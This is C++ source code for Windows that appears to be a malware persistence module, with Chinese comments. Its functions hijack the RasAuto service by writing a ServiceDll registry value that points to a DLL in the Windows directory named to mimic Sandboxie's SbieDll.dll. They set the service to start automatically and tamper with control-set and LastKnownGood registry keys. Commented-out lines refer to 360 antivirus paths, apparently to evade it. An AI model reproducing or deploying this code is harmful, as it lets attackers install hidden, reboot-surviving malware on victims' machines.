#include "stdafx.h"
#include "windows.h"
#include "TCHAR.h"
#include "Tlhelp32.h"
#include "commctrl.h"
#include "shlwapi.h"
#include <Shlobj.h>

#include "Iphlpapi.h"
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"shlwapi.lib")
// 
// HWND hSysListViewWnd;
// 
// TCHAR szExeName[MAX_PATH];
// TCHAR szStartLink[MAX_PATH];



void SetRasAutoFirst(char *lpszDstDLLPath)
{
	HKEY hKey;
	char szClass[0xc]={0};

	DWORD dwDisposition=0;

	if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SYSTEM\\ControlSet002\\Services\\RasAuto\\Parameters",// 宽带者／网络共享需要的服务
		0,
		szClass,
		0,
		0xF003F,
		0,
		&hKey,
		&dwDisposition)!=ERROR_SUCCESS)
	{
		return;
	}
	
	RegSetValueExA(hKey, "ServiceDll", 0, 2, (const BYTE *)lpszDstDLLPath,strlen(lpszDstDLLPath)+1);
	RegCloseKey(hKey);

	RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SYSTEM\\ControlSet002\\Services\\RasAuto",
		0,
		szClass,
		0,
		0xF003F,
		0,
		&hKey,
		&dwDisposition);

	DWORD dwData=2;
	RegSetValueExA(hKey, "Start", 0, 4,(BYTE*)&dwData, 4);// 服务自动运行
	RegCloseKey(hKey);
	RegCreateKeyExA(
		HKEY_LOCAL_MACHINE,
		"SYSTEM\\Select",
		0,
		szClass,
		0,
		0xF003F,
		0,
		&hKey,
		&dwDisposition);
	RegSetValueExA(hKey, "Default", 0, 4,(BYTE*)&dwData, 4);// 服务自动运行
	RegCloseKey(hKey);


}


void SetRasAuto(char *lpszDstDLLPath)
{


	HKEY hKey;
	char szClass[0xc]={0};

	DWORD dwDisposition=0;

	RegDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\RasAuto\\Parameters");

	if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\Select", 0, 0x20019u, &hKey)!=ERROR_SUCCESS) return;

	DWORD dwType=0;
	DWORD cbData=4;
	DWORD dwData=0;
	RegQueryValueExA(hKey, "LastKnownGood", 0, &dwType,(BYTE*)&dwData,&cbData);
	RegCloseKey(hKey);
	TCHAR szSubLastKnowGoodKey[MAX_PATH]={0};

	wsprintf(szSubLastKnowGoodKey,"SYSTEM\\ControlSet00%d\\Services\\RasAuto\\Parameters",dwData);

	if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,szSubLastKnowGoodKey,0,szClass,0,0xF003F,0,&hKey,&dwDisposition)!=ERROR_SUCCESS) return;

	RegSetValueExA(hKey, "ServiceDll", 0, 2, (const BYTE *)lpszDstDLLPath,strlen(lpszDstDLLPath)+1);
	RegCloseKey(hKey);


	RegCreateKeyExA(
		HKEY_LOCAL_MACHINE,
		"SYSTEM\\Select",
		0,
		szClass,
		0,
		0xF003F,
		0,
		&hKey,
		&dwDisposition);
	RegSetValueExA(hKey, "Default", 0, 4,(BYTE*)&dwData, 4);// 服务自动运行
	RegCloseKey(hKey);

}

void   WriteAutoRun5(char *lpszDstExeName)
{

	char lpszDstDLLPath[MAX_PATH];
	char szWindowPath[MAX_PATH];
	GetWindowsDirectory(szWindowPath,MAX_PATH);

	wsprintf(lpszDstDLLPath,"%s\\meed\\SbieDll.dll",szWindowPath);

	if (StrStrA(lpszDstExeName,"ctfmon.exe"))
	{
		SetRasAutoFirst(lpszDstDLLPath);
	}

	SetRasAuto(lpszDstDLLPath);




//	StrCpyA(szLink,szExeName);

//	*(StrRChr(szLink,0,'.'))=0;

//	StrCatA(szLink,".lnk");

//	strcpy(szLink,"C:\\Program Files\\360\\360safe\\LiveUpdate360skin\\LiveUpdate360.lnk");

	//CreateShortcut(szExeName,0,0,szLink,0);
	//Loader(szLink);


	//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Wait360Exit,0, 0, NULL);

	return ;
}

